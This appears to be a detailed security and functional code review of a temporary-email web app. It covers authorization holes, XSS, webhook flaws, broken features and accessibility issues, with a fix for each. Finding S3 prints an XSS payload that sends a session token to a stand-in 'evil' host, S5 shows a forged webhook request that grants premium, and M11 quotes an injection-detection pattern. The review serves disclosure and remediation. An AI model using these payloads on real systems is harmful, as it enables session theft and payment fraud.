# Phantom Mail — Code Review

Full read of `functions/` (34 Pages Functions), `email-handler/worker.js`,
`admin-worker/worker.js`, and `public/` (app.js, sw.js, index.html, _headers).
Every finding below cites the file and line it was verified against.

Severity key: **S** = security, **F** = functional/user-visible breakage,
**M** = medium, **U** = upgrade/hardening.

---

## Summary

| § | Severity | Count |
|---|---|---|
| 1 | Critical / high security | 7 |
| 2 | High functional — feature is broken in production today | 8 |
| 3 | Medium (backend) | 18 |
| 4 | UI / UX / accessibility | 9 |
| 5 | Architecture upgrades | 8 |

Three findings are "the feature does not work at all in production":
attachments (F1), plain-text email bodies (F2), and open tracking (F4).

The structural cause behind the worst security finding is duplication: the
address-ownership gate is copy-pasted into six files with small differences,
and the one file that forgot it (`v1/emails/stream.js`) is a full cross-account
inbox read.

The UI is in better shape than the backend — `styles.css` has a real token
layer, a z-index scale, reduced-motion support and focus-visible rings. Its
problems are localised regressions against its own standard: one failing colour
token used in 60 rules, and five CSS rules that delete the focus ring from the
entire compose window.

---

## 1. Security

### S1 — SSE stream has no ownership gate (cross-account inbox read)
`functions/api/v1/emails/stream.js`

`GET /api/v1/emails?address=…` correctly refuses to read a claimed/saved
address that belongs to another account:

```js
// functions/api/v1/emails.js
const protectedAddr = meta.isSaved === true || !!meta.owner || !!meta.claimedBy;
if (protectedAddr && normalizeUser(keyData.userId) !== normalizeUser(ownerVal)) {
    return json({ error: 'This address is claimed by another account.' }, 403, rlHeaders);
}
```

`GET /api/v1/emails/stream?address=…` performs **no such check**. It validates
the API key, validates the address format and domain, and then streams the
inbox — `init` with the full current inbox plus live `new_email` events.

Since a `pm_free_*` key is minted automatically for every signup
(`functions/api/auth/signup.js:127`), any person who registers an account can
read any other user's saved/claimed inbox in real time, given only the address.

**Fix:** lift the `meta.owner`/`claimedBy` check out of `v1/emails.js` into a
shared helper and call it from `stream.js` before the `ReadableStream` is
constructed.

### S2 — Address ownership can be taken over by any signed-in user
`functions/api/user/saved-emails.js:95-103`, `functions/api/claim.js:94-106`

Both write `meta.owner` unconditionally:

```js
// saved-emails.js — handlePost
let meta = {};
try { meta = JSON.parse(metaStr || '{}'); } catch (_) {}
meta.isSaved   = true;
meta.owner     = username;          // <- no check on the existing owner
await env.INBOX_META.put(`meta:${addrHash}`, JSON.stringify(meta));
```

`claim.js` is the same (`meta.claimedBy = session.username; meta.owner = session.username;`).
Ed25519 signature verification in `claim.js` only proves the caller holds a key
they generated themselves — it says nothing about the address.

Every read/delete gate in the codebase resolves permission from
`meta.owner || meta.claimedBy`. So user B calling
`POST /api/user/saved-emails {address: "<user A's saved address>"}` becomes the
owner, and user A is locked out while B reads all of A's mail.

**Fix:** in both handlers, if `meta.owner`/`meta.claimedBy` is already set and
does not normalize to the caller, return 409.

### S3 — Stored XSS via the Reply button
`public/app.js:335`

Email HTML is rendered safely in a sandboxed iframe by `_renderEmailBody()`.
`_replyToEmail()` bypasses all of it:

```js
if (editorEl) editorEl.innerHTML =
  `<br><br><blockquote …>--- Original ---<br>${escapeHtml(sender.name || sender.email)} wrote:<br>${email.htmlBody || escapeHtml(email.body || '')}</blockquote>`;
```

`email.htmlBody` is attacker-controlled and interpolated raw into the main
document. `<img src=x onerror="fetch('//evil/'+localStorage.authToken)">` in an
inbound email fires the moment the victim clicks Reply, in the
`mail.unknowns.app` origin, with the session token in `localStorage`.

A working sanitizer already exists in the same file (`sanitizeHtml()`,
`app.js:1741`) and is never called.

**Fix:** `${sanitizeHtml(email.htmlBody) || escapeHtml(email.textBody || email.body || '')}`.

### S4 — Stored XSS via SVG avatar upload
`functions/api/user/avatar.js:38-50` + `functions/api/avatar.js`

`user/avatar.js` accepts anything matching `image/*`:

```js
if (!file.type.startsWith('image/')) { … }
const rawExt = (file.type.split('/')[1] || 'jpg').replace('jpeg','jpg').replace('svg+xml','svg');
```

The explicit `svg+xml` handling shows SVG was anticipated but not blocked.
`/api/avatar` then serves it back from the app's own origin:

```js
return new Response(obj.body, {
  headers: {
    'Content-Type': contentType,          // image/svg+xml
    'Cache-Control': 'public, max-age=86400',
    'Access-Control-Allow-Origin': '*'
  }
});
```

No `X-Content-Type-Options`, no CSP, no `Content-Disposition`. Navigating to
`https://mail.unknowns.app/api/avatar?key=avatars/attacker.svg` executes the
embedded script in the site origin.

Note the sibling endpoint `functions/api/avatar-upload.js:816` has a correct
allowlist (`jpeg/png/webp/gif`). Two upload endpoints, and the weaker one wins.

**Fix:** apply `ALLOWED_TYPES` from `avatar-upload.js` to `user/avatar.js`
(or delete the duplicate endpoint), and add
`X-Content-Type-Options: nosniff` + `Content-Security-Policy: default-src 'none'; sandbox`
to `/api/avatar`.

### S5 — Payment webhook: fail-open signature check + non-idempotent grant
`functions/api/webhooks/payment.js:372-378, 441-518`

Two independent problems:

**(a) Fail-open.** Verification is conditional on the secret existing:

```js
if (env.NOWPAYMENTS_IPN_SECRET) {
    const isValid = await verifyNowPaymentsSig(...);
    if (!isValid) return new Response('Forbidden', { status: 403 });
}
```

If the secret is ever unset or misnamed, the endpoint accepts unsigned POSTs.
`POST /api/webhooks/payment {"payment_id":"x","payment_status":"finished","order_id":"user:victim:annual:0"}`
grants a year of premium. `functions/api/webhooks/resend.js:35` has the same
pattern.

**(b) Not idempotent.** `finished` stacks duration onto the existing expiry:

```js
const baseExpiry = (user.premiumExpiry && user.premiumExpiry > now) ? user.premiumExpiry : now;
const newExpiry  = baseExpiry + planMs;
```

`existing` is read at line 417 but never consulted. NOWPayments retries IPNs, so
every redelivery of the same `payment_id` adds another 30/365 days. The Resend
webhook already solves this correctly with a `webhookseen:{svix-id}` marker —
the payment webhook has no equivalent.

**Fix:** return 503 when the secret is missing (fail closed), and guard the
`finished` branch on `existing?.status !== 'finished'`.

### S6 — v1 send API allows sending from any address
`functions/api/v1/send.js:83-88`

Validation stops at the domain:

```js
const fromDomain = from.split('@')[1]?.toLowerCase();
if (!ALLOWED_DOMAINS.includes(fromDomain)) { return … 403 }
```

`functions/api/send.js:131-141` does it properly, checking `from` against
`session.currentAddress` and `user.savedAddresses`. The v1 path has no
equivalent, so any Pro key can send mail as any user's claimed address on your
domains — with your SPF/DKIM behind it.

**Fix:** resolve `keyData.userId` → user record and apply the same
`ownsFrom` check.

### S7 — Sent-mail delete is unauthenticated
`functions/api/sent.js:510-522`

```js
if (!key) return json({ error: 'key required' }, 400);
if (!key.startsWith('sent:')) return json({ error: 'Forbidden' }, 403);
if (address && !key.startsWith(`sent:${address}:`)) return json({ error: 'Forbidden' }, 403);
await env.EMAILS.delete(key);
```

No Bearer token required for the delete itself; the token is only consulted for
the optional `idxKey` cleanup afterwards. Keys are `sent:{from}:{timestamp}` —
guessable for a known address. Anyone can destroy another user's sent records.

**Fix:** require a session, resolve the owner of the `from` component, and
verify before deleting.

---

## 2. Broken features

### F1 — Attachments never download (403 on every request)
`functions/api/attachment.js:5` vs `email-handler/worker.js:399`

The handler writes R2 keys as:

```js
const attKey = `${dKey}/${addressHash}/${attId}_${att.filename || 'attachment'}`;
// e.g. "unkn0wn/9f3c…/att_1730000000000_a1b2c3_invoice.pdf"
```

The download endpoint requires a different prefix:

```js
if (!key || !key.startsWith('attachments/')) {
    return new Response('Forbidden', { status: 403 });
}
```

`grep -rn "ATTACHMENTS.put"` confirms nothing anywhere writes an
`attachments/`-prefixed key. Every image preview (`app.js:933`), inline
audio/video (`app.js:991`), PDF lightbox and download button (`app.js:1611`)
returns 403. The stale comment on `attachment.js:12` documents a *third* key
layout, so this endpoint has been out of sync across two schema changes.

**Fix:** validate against `^(unkn0wn|phant0m)/[0-9a-f]{64}/` and derive the
address hash from the key so the ownership gate can be applied (see M9).

### F2 — Plain-text emails render as "No content"
`public/app.js:1093-1304` vs `email-handler/worker.js:441-456`

The stored record uses `htmlBody` and `textBody`. The renderer checks:

```js
if (email.htmlBody)      { … }
else if (email.body)     { … }   // never set by the ingest worker
else if (email.rawSource){ … }   // never set by the ingest worker
else body.innerHTML = '<p style="color:#888;">No content</p>';
```

`grep -n "textBody" public/app.js` returns nothing. Any email without an HTML
part — a large share of OTP, CI, and CLI-generated mail, which is the core use
case for a temp-mail service — displays as empty. The same mismatch makes
`app.js:877` refetch the full body on every open and still find nothing.

**Fix:** add `else if (email.textBody)` before the `email.body` branch.

### F3 — Starring does not protect an email from auto-deletion
`functions/api/email.js:138`, `functions/api/emails/batch.js:138`,
`email-handler/worker.js:307, 418`

Cap enforcement decides what to delete from KV **list metadata**:

```js
const deletable = sorted.filter(k => !k.metadata?.starred);
```

That metadata is written once at ingest (`worker.js:460`). Both star handlers
re-PUT without a `metadata` option:

```js
await env.EMAILS.put(key, JSON.stringify(emailData), { expirationTtl: ttl });
```

Cloudflare KV replaces metadata on write, so it becomes `undefined` and the
starred email is treated as deletable. Starring an email currently makes it
*more* likely to be purged than leaving it alone, since the first star also
wipes the `read`/`from`/`subject` metadata the list view and ETag rely on.

**Fix:** pass `{ expirationTtl: ttl, metadata: { read, starred, from, subject, receivedAt } }`
on every re-PUT in `email.js` and `batch.js`.

### F4 — Open tracking discards ~all real opens
`functions/api/track.js:21-32`

```js
const BOT_UA_PATTERNS = [
    'googleimageproxy', 'iphone', 'applewebkit',   // Apple MPP
    …
];
if (BOT_UA_PATTERNS.some(p => uaLower.includes(p))) return;
```

`AppleWebKit` appears in the UA of Chrome, Edge, Safari, Opera, and every iOS
browser — it is in the overwhelming majority of real user agents. `iphone` is
similarly over-broad. Only Firefox opens are ever recorded.

**Fix:** drop `applewebkit` and `iphone`; match Apple MPP on
`GoogleImageProxy` and the Apple proxy ranges instead.

### F5 — Real-time silently dies for saved (premium) addresses
`functions/api/pusher/auth.js:84-96` vs `public/app.js:4744`

The client subscribes to a private channel derived from the address it is
currently showing:

```js
const usePrivate  = !!token && _isSavedAddress(currentEmail);
const channelName = (usePrivate ? 'private-inbox-' : 'inbox-') + hash;
```

The auth endpoint only ever authorizes the channel derived from
`session.currentAddress`:

```js
const currentAddress    = session.currentAddress || null;
const addrChannelSuffix = currentAddress ? await sha256Short(currentAddress…) : null;
const inboxChannel      = addrChannelSuffix ? `private-inbox-${addrChannelSuffix}` : null;
if (!inboxChannel || channelName !== inboxChannel) return … 403;
```

`session.currentAddress` is written **only** by `POST /api/generate`
(`generate.js:260`). Selecting a saved address from the dashboard never updates
it, so the subscription 403s and the feature degrades to 48-second polling —
for exactly the paying users who were sold real-time.

**Fix:** authorize against the union of `session.currentAddress` and every
`user.savedAddresses[].address`, or resolve `meta.owner` for the requested
channel's hash.

### F6 — Service worker permanently pins app.js and styles.css
`public/sw.js:10, 33, 71-84`

```js
const CACHE = 'phantom-v2.0.0';
const STATIC_EXT = /\.(?:css|js|png|svg|woff2)$/;
…
event.respondWith(caches.match(request).then(cached => {
    if (cached) return cached;     // no revalidation, ever
    …
}));
```

Cache-first with no stale-while-revalidate and a hardcoded cache name means a
returning user runs the `/app.js` and `/styles.css` they first cached, forever,
regardless of what you deploy. The `_headers` `max-age=3600` never applies
because the SW answers before the network. Every fix in this document will be
invisible to existing users until `CACHE` is bumped.

**Fix:** stale-while-revalidate for static assets (serve cache, refresh in the
background), and derive `CACHE` from a build hash.

### F7 — Public API returns null attachment names and types
`functions/api/v1/emails.js`, `functions/api/v1/emails/stream.js` (`project()`)

```js
attachments: (meta.attachments || []).map(a => ({ name: a.name, size: a.size, type: a.type }))
```

Stored attachment objects are `{ id, key, filename, mimeType, size }`
(`worker.js:403-408`). `name` and `type` are always `undefined` → serialized as
missing. Documented API fields that never carry data.

**Fix:** `{ name: a.filename, size: a.size, type: a.mimeType }`.

### F8 — "View source" never shows MIME source
`functions/api/email/raw.js:1063`

```js
const rawSource = emailData.rawSource || emailData.htmlBody || emailData.body || '';
```

`rawSource` is never persisted by the ingest worker, so this always falls
through to `htmlBody`, served as `text/plain` with a `.eml` filename.

**Fix:** either store a truncated `rawSource` at ingest (bounded, e.g. 64 KB) or
reconstruct a minimal RFC 822 view from `headers` + bodies and drop the
misleading `.eml` disposition.

---

## 3. Medium (backend)

**M1 — Password-reset enumeration via timing.** `auth/send-otp.js:63-67`.
The decoy path returns immediately for unknown accounts, skipping the KV
rate-limit read/write and the ~300 ms Resend call that the real path performs.
The response body is byte-identical, as the comments carefully ensure — the
latency is not. Perform the same work (or an equivalent delay) on both paths.

**M2 — Email-based password reset can never succeed.** `auth/send-otp.js:57-59`.
An input containing `@` is used verbatim as `user:{email}`, but users are keyed
by username only. Either remove the branch or add an `emailidx:{email} → userKey`
index.

**M3 — Account deletion leaves forwarding active.** `user/profile.js:205-254`.
`forward:{address}` rules (written by `user/forwarding.js:66`, read by
`worker.js:194`) are never deleted, nor are `track:*` / `sentid:*`. Inbound mail
keeps being forwarded to a deleted user's external mailbox indefinitely — a
privacy and abuse problem, not just leaked keys.

**M4 — Two contradictory MD5 implementations.** `email-handler/worker.js:41`
and `admin-worker/worker.js` both state Workers has no MD5 and ship 80 lines of
pure-JS RFC 1321. `webhooks/payment.js:624` calls
`crypto.subtle.digest('MD5', …)`. Both cannot be right. The payment path wraps
everything in a `try/catch` that only warns, so if it is the wrong one the
`payment_confirmed` push fails silently on every upgrade. Consolidate into one
shared helper.

**M5 — Bulk "mark as read" is a stub that reports success.**
`emails/batch.js:149-154` returns `{ success: true, processed: keys.length }`
without writing anything. The UI shows the action as applied; it is not
persisted and reverts on refresh.

**M6 — Inbound handler has no try/catch.** `email-handler/worker.js:340`.
A `PostalMime` parse failure, an R2 outage, or a KV error throws out of
`email()`, which Cloudflare Email Routing treats as a delivery failure. Wrap the
body and always persist at least a stub record so mail is never lost.

**M7 — Overflow trim removes only one message.** `worker.js:416-433`.
When `existing.keys.length >= cap` exactly one oldest message is deleted. An
inbox that is several over cap (plan downgrade, cap change) never converges
until the 6-hour cron.

**M8 — Unsanitized MIME filename in R2 keys.** `worker.js:399`.
`att.filename` comes straight from the message and can contain `/`, newlines,
control characters, or be arbitrarily long. Sanitize and cap before
interpolating into the key.

**M9 — `/api/attachment` has no authorization.** Once F1 is fixed, any caller
holding a key string downloads the blob. Derive `addrHash` from the key path and
run the same `requireAddressOwner` gate `email.js` uses.

**M10 — Unclamped Range handling.** `attachment.js:54-73`. `end` is not clamped
to `obj.size - 1` and `start > end` produces a negative `length`. Malformed
`Range` should be a 416, not a broken 206.

**M11 — WAF false positives and a crash.** `_middleware.js:195`.
`decodeURIComponent(queryString)` throws `URIError` on a malformed percent
sequence — uncaught, so `?x=%` 500s any API route. Separately,
`INJECTION_PATTERNS` includes `/on\w+\s*=/i`, which matches benign values
(`?sort=on desc`, base64 containing `on=`) and **auto-bans the IP for an hour**
(`_middleware.js:196`). Wrap the decode and tighten the pattern.

**M12 — Contradictory security headers.** `_middleware.js:420` sets
`X-Frame-Options: DENY` on `/api/*` while `public/_headers` sets `SAMEORIGIN`
for pages; `Permissions-Policy` also differs. Harmless today, confusing to audit.

**M13 — Wrong number in a user-facing error.** `send.js:228` and `send.js:250`
say "Upgrade to Premium for 50/day" while the premium limit is 25
(`send.js:198`, and `config.js:692` reports 25).

**M14 — Read-modify-write races on every KV counter.** `trackEvent`,
`analytics:*`, `api_usage:*`, `rate:inbound:*`, `send_rate:ip:*`, `otp_rate:*`
all do `get` → `parseInt` → `put`. Concurrent requests undercount, so quotas
leak under exactly the load they exist to limit. `send.js:236-252` already
solved this correctly with the `sendslot:` reservation pattern — apply it to the
quota-bearing counters, or move them to a Durable Object.

**M15 — `v1/status.js` throws when a binding is missing.** Lines 47-51 use
`env.INBOX_META?.get(...).then(...)`: the optional chain yields `undefined` and
`.then` throws a `TypeError`. Every other file uses the safe
`await env.INBOX_META?.get(...)` form.

**M16 — Pro keys can squat live addresses.** `v1/generate.js` lets a Pro key
mint any `username@domain`. Dedup markers expire in 1–24 h while saved inboxes
live 15 days, so a Pro key can collide with an address someone is actively
using. It does not grant read access (the gate in `v1/emails.js` holds), but it
does allow denial-of-address.

**M17 — Admin login has no lockout.** `admin-worker/worker.js:349-359` counts
failures per IP per 10 minutes and sends an alert email at 5 — it never blocks.
Add an actual lockout after N failures.

**M18 — `/api/qr` is an open third-party proxy.** `qr.js:749` forwards arbitrary
user input to `api.qrserver.com` and returns the response base64-encoded, with
only a per-IP daily cap. It also leaks every generated address to a third party,
which contradicts the product's privacy positioning. Generate the QR locally.

---

## 4. UI / UX / accessibility

**Credit where due first.** `styles.css` is genuinely well-built for a 3,900-line
hand-written sheet: a real design-token layer (`:root`), a documented and
actually-respected `--z-*` stacking scale, a 30-section table of contents, a
`prefers-reduced-motion` block (line 3870) that kills the ghost/aura animations,
a global `:focus-visible` ring (line 284) with the correct
`:focus:not(:focus-visible)` companion, and `role="dialog"` + `aria-modal="true"`
on all eight modals with `role="status"` on the toast. Most projects at this size
have none of that. The findings below are real regressions against the standard
the sheet already sets for itself.

### UI-1 — `--text-muted` fails WCAG AA everywhere it is used
`styles.css:74` — `--text-muted: #64748b`

Measured contrast:

| Foreground | Background | Ratio | AA (4.5:1) |
|---|---|---|---|
| `--text-muted #64748b` | `--surface-2 #161b22` | **3.63:1** | fail |
| `--text-muted #64748b` | `--surface #0d1117` | **3.98:1** | fail |
| `--text-muted #64748b` | `--bg #07080f` | **4.20:1** | fail |
| `--violet #7c5cfc` | `--surface #0d1117` | **4.32:1** | fail |
| `--text-dim #94a3b8` | `--surface #0d1117` | 7.38:1 | pass |
| `--text #e2e8f0` | `--surface #0d1117` | 15.35:1 | pass |
| `--accent #00e5b3` | `--surface #0d1117` | 11.59:1 | pass |
| `--danger #f04438` | `--surface #0d1117` | 5.04:1 | pass |

`--text-muted` appears in 60 rules, and the sheet has 37 rules at 9–11 px font
size — so the failing colour is concentrated in exactly the smallest text
(timestamps, attachment sizes, placeholders, quota labels, helper copy).
`--violet` is the premium accent, so the pricing and Pro labels are the least
readable text on the page.

**Fix — two token edits, nothing else changes:**

```css
--text-muted: #7d8b9e;   /* 4.99:1 on surface-2, 5.46 on surface, 5.77 on bg */
--violet:     #8f75ff;   /* 5.07:1 on surface-2, 5.55 on surface */
```

Keep `#7c5cfc` as `--violet-fill` for backgrounds/borders where contrast doesn't
apply.

### UI-2 — The entire compose window has no visible focus indicator
`styles.css:2469, 2479, 2501, 2530, 2625`

```css
.cw-select:focus          { outline: none; }
.cw-input:focus           { outline: none; }
.cw-custom-username:focus { outline: none; }
.cw-subject-input:focus   { outline: none; }
.cw-editor:focus,
.cw-textarea:focus        { outline: none; }
```

Five rules remove the outline and substitute **nothing** — no border change, no
background change, no shadow. They are more specific than the global
`:focus-visible` rule at line 284, so they win. Tabbing through To → From →
Subject → Body gives zero visual feedback about where you are. This is a
straight WCAG 2.4.7 (Focus Visible) failure on the app's primary input surface.

`.pdash-input`/`.perm-username-field` (line 814) have the same problem.
`.auth-input` (2870) and `.forwarding-input` (954) at least swap in
`border-color: var(--accent)`, which is weak but visible.

**Fix:** delete the five bare `outline: none` rules and let the global
`:focus-visible` ring apply, or replace each with
`:focus-visible { outline: 2px solid var(--accent); outline-offset: -2px; }`
if the inset look is wanted.

### UI-3 — Modals declare `aria-modal` but don't trap focus
`index.html:332, 393, 509, 553, 602, 644, 659, 674` + `app.js`

All eight modals set `aria-modal="true"`, which tells assistive tech that
everything outside is inert — but nothing enforces it. There is no Tab
containment, focus is never moved into the dialog on open (only `compose-to` and
the three OTP fields ever get `.focus()`), and focus is never restored to the
triggering button on close. A keyboard user opening the email reader Tabs
straight through the dialog and into the page behind the scrim, where the
`aria-modal` contract says nothing exists.

**Fix:** one shared `trapFocus(dialogEl)` helper — cache
`document.activeElement`, focus the first tabbable child, cycle Tab/Shift-Tab
within the dialog, restore on close. About 25 lines, applied in the eight
existing open/close functions.

### UI-4 — Escape closes every modal at once
`app.js:3567-3571`

```js
if (e.key === 'Escape') {
    closeModal(); closeAbout(); closeQR(); closePremiumFlow(); closeAuth();
    closeProfile(); closeAttLightbox(); closeCompose();
    closeSignOutConfirm(); closePremiumRequiredPrompt();
}
```

Ten close functions fire unconditionally. Open an attachment lightbox from
inside the email reader, press Escape to dismiss the lightbox — the reader
closes too, and so does a half-written compose window (`closeCompose()` is in
the list). Losing a draft to a stray Escape is the worst version of this.

The correct function already exists and is used for the browser back button:
`_closeTopmostModal()` (`app.js:3562`). Escape should call that instead.

### UI-5 — Icon buttons are 40×40, below the minimum touch target
`styles.css:529-534`

```css
.icon-btn { width: 40px; height: 40px; }
```

WCAG 2.5.8 and the iOS HIG both put the floor at 44×44. The address card packs
five of these side by side (QR, refresh, regenerate, delete, plus the copy
button) — and one of them is the destructive *delete address* action, sitting
directly beside *generate new address*. That is the highest-consequence mis-tap
in the app, at a sub-minimum target size, on mobile.

`min-height: 44px` appears exactly once in the whole 3,922-line sheet (line 1030).

**Fix:** 44×44 in the `< 860px` block at minimum, and put a gap or a confirm step
between "new address" and "delete address".

### UI-6 — Breakpoint collision at exactly 860px
`styles.css:3523` (`max-width: 860px`), `3634` (`max-width: 859.98px`), `3890` (`min-width: 860px`)

The main mobile layout block correctly uses `859.98px` to avoid overlapping the
desktop `min-width: 860px` block. The toast block at line 3523 uses `860px`, so
at a viewport of exactly 860 px **both** apply: desktop split-pane layout with
the toast pinned to the top of the screen in its mobile position. 860 px is not
an exotic width — it's a common tablet-landscape and split-screen size.

**Fix:** change line 3523 to `859.98px` to match, or better, define the
breakpoint once (`--bp-mobile`) and use a consistent `(width < 860px)` /
`(width >= 860px)` range-syntax pair.

### UI-7 — Four of seven pages don't use the stylesheet
`offline.html`, `terms.html`, `privacy-policy.html`, `acceptable-use.html`

Only `index.html`, `premium.html` and `api-docs.html` link `styles.css`; the
other four carry their own inline `<style>` blocks. So the design tokens are not
the "single source of design truth" the header comment claims — the legal pages
have a hand-copied fork of the palette that will drift the first time a token
changes (and will not pick up the `--text-muted` fix above).

They also omit `viewport-fit=cover`, which `index.html` sets, so they don't
respect notch/home-indicator safe areas on iOS.

**Fix:** link `styles.css` from all seven pages and reduce the inline blocks to
page-specific rules.

### UI-8 — Email iframe sandbox is self-defeating
`app.js:1236`

```js
iframe.setAttribute('sandbox',
  'allow-same-origin allow-popups allow-popups-to-escape-sandbox allow-scripts');
```

`allow-same-origin` + `allow-scripts` together is the documented way to *undo* a
sandbox: the frame runs in your origin with access to `localStorage` and the
parent DOM. The only thing stopping an email from taking the session is the
`<meta>` CSP injected at line 1241.

The inline comment says `allow-same-origin` is "needed for external images to
load". That's not correct — images load fine in an opaque-origin sandbox.

**Fix:** drop `allow-same-origin` and `allow-scripts`. Keep the meta CSP as
defence in depth. The auto-resize logic at `app.js:1258` reads
`iframe.contentDocument`, which does need same-origin — replace it with a
`postMessage` height ping, or accept a fixed max-height with internal scrolling.

### UI-9 — Smaller UI bugs

- **`formatSize()` (`app.js:1774`)** — `s = ['B','KB','MB']`; a ≥ 1 GB attachment
  renders `undefined`. Add `'GB'` and clamp the index to `s.length - 1`.
- **68 inline `onclick=` handlers in `index.html`** are the sole reason
  `'unsafe-inline'` sits in the `script-src` of `public/_headers`. Converting to
  delegated listeners is the single largest CSP improvement available, and it's
  mechanical work.
- **Semantics are mostly good** — 61 real `<button>` elements vs only 8 `<div
  onclick>` and 2 `<span onclick>`. Those 10 still need `role="button"`,
  `tabindex="0"` and a keydown handler, or to become buttons.
- **`aria-live` is used once** (`#addr-ttl`, a countdown that fires every second —
  arguably the one place it should *not* be). The inbox list, which is what
  actually updates asynchronously, has no live region, so screen-reader users get
  no announcement when mail arrives.
- **Polling cost** — `app.js:1714-1717` keeps a 48 s poll running as a "safety
  net" even while Pusher reports `connected`. Across idle tabs this is the
  dominant KV read cost. Gate it on connection state and fire one reconcile poll
  on reconnect.
- **Offline UX** — the SW caches the shell, but an `/api/emails` failure renders
  an empty inbox rather than "offline, showing last known mail". You already
  cache API responses in `localStorage` (`_cacheGet`, `app.js:74`); surface it.
- **`.hidden` vs `!important`** — the desktop block (line 3890) uses
  `display: none !important` / `display: flex` on the same elements the `.hidden`
  utility toggles. It works today, but any new JS that toggles `.hidden` on
  `.mobile-signin-row` or `#premium-dashboard` will silently do nothing at
  ≥ 860 px.

---

## 5. Architecture upgrades

- **Extract `functions/_lib/`.** `sha256Hex`, `domainKey`, `normalizeUser`,
  `requireAddressOwner`, and `json` are each redefined in six-plus files. The
  ownership gate in particular exists in six near-identical copies, and the copy
  that was never written is S1. One shared module removes an entire class of bug.
- **One source of truth for domains.** `ALLOWED_DOMAINS` / `DOMAINS` /
  `isReservedEmail` are hardcoded in 12+ files, plus both `wrangler.toml`s.
  Adding a third domain today means 12 coordinated edits.
- **Raise PBKDF2 iterations.** 100 000 (`signin.js:134` and three other copies)
  is below current OWASP guidance (600 000 for PBKDF2-HMAC-SHA256). Store the
  iteration count on the user record so existing hashes can be upgraded lazily
  on next successful login.
- **Add global session revocation.** `profile.js:178-182` explicitly leaves all
  other sessions alive after a password change and logs a note instead. Store a
  `tokenVersion` on the user, stamp it into each session, and compare on lookup —
  O(1) "sign out everywhere", and it makes password reset actually protective.
- **Add tests and CI.** There are none. A small `vitest` +
  `@cloudflare/vitest-pool-workers` suite over (a) the ownership gate, (b) the KV
  key contracts shared between the ingest worker and the Functions, and (c) the
  two webhook signature verifiers would have caught S1, S2, F1, F3 and F7
  mechanically.
- **Add a `wrangler.toml` for the Pages project.** Bindings, compatibility date
  and flags are currently implicit — the Functions rely on `EMAILS`,
  `INBOX_META`, `API_KEYS`, `ATTACHMENTS` and on Ed25519 support in WebCrypto
  (`claim.js:80`) with nothing declaring them.
- **Pin dependencies.** The root `package-lock.json` is 91 bytes with no
  `package.json`; `postal-mime` and `otpauth` are `^`-ranged in both workers.
- **Move Pusher IDs out of git.** `PUSHER_APP_ID` and `PUSHER_KEY` are committed
  in both `wrangler.toml`s. The key is public by design; the app ID is not.

---

## 6. Suggested order of work

1. **F6** — ship the service-worker fix *first*, or returning users never receive
   any of the frontend fixes below.
2. **F1** — attachments. One-line prefix fix restores an entire feature.
3. **S3, S4** — the two XSS paths to session-token theft.
4. **S1, S2, S6, S7** — authorization holes. Do S1/S2 together with the
   shared-ownership-gate refactor so they can't recur.
5. **S5** — fail-closed webhooks + idempotent premium grant.
6. **F2, F3, F4** — visibly broken features, all small diffs.
7. **UI-1, UI-2, UI-4, UI-5** — two token edits, five deleted CSS rules, one
   changed function call, one size bump. Highest UI payoff per line changed.
8. **F5, F7, F8**, then UI-3/6/7/8 and the M-list.

Items 1–6 are all small, independent diffs. Happy to implement any subset —
say the word and I'll open a PR.
